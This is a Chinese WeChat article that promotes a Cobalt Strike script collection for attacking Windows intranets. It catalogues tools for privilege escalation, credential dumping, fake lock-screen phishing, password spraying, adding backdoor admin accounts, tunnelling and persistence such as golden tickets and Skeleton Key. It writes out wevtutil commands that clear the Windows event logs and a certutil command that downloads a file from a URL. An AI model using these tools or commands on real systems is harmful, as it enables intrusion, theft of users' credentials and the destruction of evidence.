> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/i4ImGxeOLaIZMzlIT3Rh3A)

![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM4ibOMiaiciarUq7WoC7ehF4CmMsWlCZurcD5CsyOXjia3A5sSBud5UpETslS5c8pyr3CicUPbSLuLbKlHw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM4ibOMiaiciarUq7WoC7ehF4CmM0PmPJZoRlTcRibRibdBA40wsHX7F1UpPHUys0dE7eT2VhwP63oWJ3SsA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM4ibOMiaiciarUq7WoC7ehF4CmMYud6oVYdHIekQbTSsibSCianH468Zh7uY480hM0mJyv8hj10oSuqgyCQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM4ibOMiaiciarUq7WoC7ehF4CmM5HUeDUiakrmL0WicGr9Iibsu2FBN1KFNhrdTz3Epg8vJiaIVERfZ4orerg/640?wx_fmt=png)

提权
--

1.  watson 获取可提取漏洞
    
2.  sweetpotato
    
3.  juicypotato
    
4.  MS14-058
    
5.  MS15-051
    
6.  MS16-016
    
7.  MS16-032
    
8.  MS16-135
    
9.  CVE-2020-0796
    
10.  SharpBypassUAC
    

信息搜集
----

1.  单机常用命令
    

*   systeminfo
    
*   whoami /all
    
*   ipconfig /all
    
*   查看路由表
    
*   查看 arp 缓存
    
*   查看用户信息
    
*   查看安装程序和版本信息
    
*   查看安装的补丁
    
*   查看运行的进程及路径
    
*   查看进程详细信息
    
*   查看服务
    
*   查看防火墙配置
    
*   查看计划任务
    
*   查看启动程序信息
    
*   查看在线用户
    
*   查看开机时间
    
*   查看 powershell v5 历史命令
    
*   查看最近使用的项目
    
*   查看 SMB 指向路径
    

3.  域环境常用命令
    

*   列出域控制器名称
    
*   查询当前域中在线的计算机
    
*   查询当前域中在线的计算机 (只显示名称和操作系统)
    
*   查询当前域中所有计算机
    
*   查询当前域中所有计算机 (只显示名称和操作系统)
    
*   查询域内所有用户
    
*   查询所有 GPO
    

*   AdFind
    
*   查询域
    
*   查看域管
    
*   查看域用户详细信息
    
*   查看当前登陆域
    
*   查看时间服务器
    
*   显示当前域的计算机列表
    
*   查看登陆本机的域管
    
*   查看所有域用户
    
*   查看域内所有用户组列表
    
*   查看主域控制器
    
*   查看域控列表
    
*   查看域控主机名
    
*   获取域信任信息
    
*   获取域密码信息
    
*   查看所有域成员计算机列表
    
*   查看域内所有计算机
    

6.  SharpChassisType 判断主机类型
    
    ```
    用于判断当前机器类型（桌面计算机、笔记本等判断）。
    ```
    
7.  SharpNetCheck 探测出网
    
    ```
    在渗透过程中，对可以出网的机器是十分渴望的。在收集大量弱口令的情况下，一个一个去测试能不能出网太麻烦了。所以就有了这个工具，可配合如wmiexec、psexec等横向工具进行批量检测，该工具可以在dnslog中回显内网ip地址和计算机名，可实现内网中的快速定位可出网机器。
    ```
    
8.  SharpEventLog(获取系统登录日志，快速定位运维机)
    
    ```
    读取登录过本机的登录失败或登录成功（4624，4625）的所有计算机信息，在内网渗透中快速定位运维管理人员。
    ```
    
9.  SharpCheckInfo(获取多项主机信息)
    
    ```
    收集目标主机信息，包括最近打开文件，系统环境变量和回收站文件等等。
    ```
    
10.  SharpSQLDump(快速列出数据库数据)
    
    ```
    内网渗透中快速获取数据库所有库名，表名，列名。具体判断后再去翻数据，节省时间。适用于mysql，mssql。
    ```
    
11.  SharpClipHistory(获取 win10 剪切板)
    
    ```
    可用于从1809 Build版本开始读取Windows 10中用户剪贴板历史记录的内容。
    ```
    
12.  SharpAVKB(杀软和补丁对比)
    
    ```
    Windows杀软对比和补丁号对比。
    ```
    
13.  SharpEDRChecker(获取 EDR 信息)
    
    ```
    检查正在运行的进程，进程元数据，加载到当前进程中的Dll以及每个DLL元数据，公共安装目录，已安装的服务和每个服务二进制元数据，已安装的驱动程序和每个驱动程序元数据，所有这些都存在已知的防御性产品，例如AV，EDR和日志记录工具。
    ```
    
14.  SharpDir(文件搜索)
    
    ```
    可在本地和远程文件系统中搜索文件。
    ```
    
15.  Everything(建立 http 服务文件搜索)
    

定位域管
----

1.  PsLoggedon
    
    ```
    微软官方工具。
    ```
    
2.  PVEFindADUser
    
    ```
    可用于查找Active Directory用户的登录位置和/或查找谁在特定计算机上登录。这应该包括本地用户，通过RDP登录的用户，用于运行服务和计划任务的用户帐户（仅当该任务当时正在运行时
    ```
    
3.  netview
    
    ```
    Netview是枚举工具。它使用（带有-d）当前域或指定的域（带有-d域）来枚举主机。如果希望指定包含主机列表的文件，也可以使用-f。您希望排除的任何主机名都可以在带有-e的列表中指定。如果要查询域组并突出显示这些用户的登录位置，请使用-g指定该组。
    ```
    

读取密码
----

1.  logonpasswords
    
2.  Krbtgt hash
    
3.  探测 wifi 密码
    

*   获取连接过的 wifi
    
*   获取 wifi 密码
    
*   SharpWifiGrabber(检索 Wi-Fi 密码)
    
    ```
    Sharp Wifi Password Grabber以明文形式从保存在工作站上的所有WLAN配置文件中检索Wi-Fi密码。
    ```
    

5.  修改注册表 dump 明文密码
    

*   显示明文
    
*   强制锁屏
    
*   隐藏明文
    

7.  提取浏览器数据及密码
    

*   BrowserGhost(提取浏览器密码)
    
    ```
    奇安信出品。这是一个抓取浏览器密码的工具，后续会添加更多功能
    ```
    
*   SharpChromium(提取浏览器数据)
    
    ```
    用于检索Chromium数据，例如Cookie，历史记录和保存的登录名。
    ```
    
*   SharpWeb(提取浏览器数据)
    
    ```
    可从Google Chrome，Mozilla Firefox和Microsoft Internet Explorer / Edge检索保存的浏览器凭据。
    ```
    

9.  本地程序文件密码解密
    

*   SharpCloud(获取云凭证)
    
    ```
    用于检查是否存在与AWS，Microsoft Azure和Google Compute相关的凭证文件。
    ```
    
*   SharpDecryptPwd(from uknowsec)
    
    ```
    对密码已保存在 Windwos 系统上的部分程序进行解析,包括：Navicat,TeamViewer,FileZilla,WinSCP,Xmangager系列产品（Xshell,Xftp)。
    ```
    
*   SharpDecryptPwd(from RcoIl)
    
    ```
    该程序主要是针对已保存在 Windows 系统上的程序密码进行解密。目前支持 Navicat 系列、Xmanager 系列、TeamViewer、FileZilla 客户端、Foxmail、RealVNC 服务端、TortoiseSVN、WinSCP、Chrome 全版本。
    ```
    

11.  钓鱼密码窃取
    

*   FakeLogonScreen(windows 锁屏钓鱼)
    
    ```
    FakeLogonScreen是用于伪造Windows登录屏幕以获取用户密码的实用程序。输入的密码已针对Active Directory或本地计算机进行了验证，以确保密码正确，然后将其显示在控制台上或保存到磁盘。
    ```
    
*   CredPhisher(认证登录框钓鱼)
    
    ```
    使用CredUIPromptForWindowsCredentialsWinAPI函数提示当前用户提供其凭据。支持一个参数以提供将显示给用户的消息文本。
    ```
    

内网扫描
----

1.  SharpWebScan(探测 web 服务)
    
    ```
    扫描 C段 的 Web 应用，获取 Title，可自定义多端口。外网也非常好用
    ```
    
2.  TailorScan(缝合怪内网扫描器)
    
    ```
    缝合怪内网扫描器，支持端口扫描，识别服务，获取title，扫描多网卡，ms17010扫描，icmp存活探测。
    ```
    
3.  fscan(一键大保健)
    
    ```
    一款内网扫描工具，方便一键大保健。支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写私钥、计划任务反弹shell、读取win网卡信息等。
    ```
    
4.  crack 爆破
    
    ```
    爆破工具,支持 ftp ssh smb mysql mssql postgres。
    ```
    
5.  SharpSpray(域内密码爆破)
    
    ```
    可以使用LDAP对域的所有用户执行密码喷雾攻击。
    ```
    

RDP 相关
------

1.  查看 RDP 端口
    
2.  探测 RDP 服务是否开启
    
3.  开启 RDP 服务
    
4.  关闭 RDP 服务
    
5.  添加防火墙放行 RDP 规则
    

添加用户
----

1.  激活 guest 用户
    
2.  添加域管用户
    
3.  创建管理员用户
    
4.  add-admin 添加用户 bypass
    
    ```
    执行后自动添加一个账户进入管理员组。
    帐号：hacker 密码：P@ssw0rd
    ```
    

内网穿透
----

1.  frpmodify 无需 frpc.ini 落地
    
    ```
    frp指定参数版（无需frpc.ini落地）
    ```
    
2.  nps 无配置文件落地
    
    ```
    一款轻量级、高性能、功能强大的内网穿透代理服务器。支持tcp、udp、socks5、http等几乎所有流量转发。使用参考：https://mp.weixin.qq.com/s/zI04_kxVFWdnegctAzNmmg。
    ```
    
3.  NATBypass 端口转发
    
    ```
    一款lcx（htran）在golang下的实现。
    通过主动连接具有公网IP的电脑打通隧道可实现内网穿透，让内网主机提供的服务能够借助外网主机来访问。软件实现的端口转发，透明代理，在主机限制入站规则但未限制出站规则的特定情况下可绕过防火墙。
    ```
    
4.  iox 端口转发与 socks5 隧道
    
    ```
    golang实现，端口转发和内网代理工具，功能类似于lcx/ew，但是比它们更好。
    ```
    

权限维持
----

1.  Skeleton Key
    
2.  白银票据
    
3.  黄金票据
    
4.  自启动运行
    

*   创建自启动服务
    
*   启动文件夹
    
*   添加注册表实现自启动
    

日志清除
----

清除系统日志

```
wevtutil cl security
wevtutil cl system
wevtutil cl application
wevtutil cl "windows powershell"

```

辅助模块
----

1.  certutil 下载文件
    
    ```
    certutil.exe -urlcache -split -f $url $path
    
    ```
    
2.  vbs 下载文件
    
    ```
    vbs脚本远程下载文件，命令行传参，执行完毕自动清除vbs下载脚本。
    
    
    ```
    
3.  SharpZip(压缩文件)
    
    ```
    对目录或文件进行压缩打包。
    
    
    ```
    
4.  SharpOSS(上传文件)
    
    ```
    “内网渗透的本质是信息收集”,尝尝会收集到一些体积较大的文件或者是源码进行分析利用。而网络情况复杂的情况下，通过菜刀一类webshell管理工具或CS一类C2工具来进行传输文件是非常慢的，而且aliyunOSS是白域名，比cs传输文件更为隐秘。所以会用到AliyunOSS来进行快速文件传输。所以就看了一下aliyun-oss-csharp-sdk实现了这个功能。
    
    
    ```
    

项目地址
----

https://github.com/z1un/Z1-AggressorScripts

公众号

最后  

-----

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**

**无害实验室拥有对此文章的修改和解释权如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的**